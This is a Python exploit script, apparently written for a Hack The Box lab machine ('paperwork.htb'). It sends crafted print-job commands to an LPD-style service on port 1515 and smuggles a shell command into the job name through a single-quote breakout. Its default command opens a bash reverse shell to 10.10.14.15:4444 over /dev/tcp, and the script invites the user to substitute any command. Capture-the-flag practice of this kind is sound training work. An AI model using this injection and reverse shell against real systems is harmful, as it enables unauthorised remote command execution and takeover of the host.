#!/usr/bin/env python3

import socket

HOST = "paperwork.htb"
PORT = 1515
QUEUE = "archive_intake"

def recv_ack(sock):
    data = sock.recv(1)
    if not data:
        print("[-] Connection closed")
        return False
    print(f"[+] ACK: {data.hex()}")
    if data != b"\x00":
        print("[-] Server rejected request")
        return False
    return True

# Change this to your desired command
# Example for reverse shell: 
CMD = "bash -c \"bash -i >& /dev/tcp/10.10.14.15/4444 0>&1\""
#CMD = "id > /tmp/pwned"   # simple test

# Build the payload: job_name will be "'; <CMD>; echo '"
# This closes the single quote, executes CMD, then reopens the quote.
payload_line = f"J'; {CMD}; echo '".encode()
content = payload_line + b"\n"          # add newline to finish the line
L = len(content)                        # actual length including newline
size = L - 1                            # because server reads size+1 bytes

with socket.create_connection((HOST, PORT)) as s:
    print("[+] Connected")

    # Send Print Job command with queue
    s.sendall(b"\x02" + QUEUE.encode() + b"\n")
    if not recv_ack(s):
        exit(1)
    print("[+] Queue accepted")

    # Send the malicious chunk
    chunk = b"\x02 " + str(size).encode() + b"\n"
    s.sendall(chunk)
    print(f"[+] Sent chunk: {chunk!r}")

    s.sendall(content)
    print(f"[+] Sent content: {content!r}")

    # Optionally read remaining ACKs (not required)
    # The server will execute the command and close the connection
    print("[*] Payload sent. Check for command execution.")
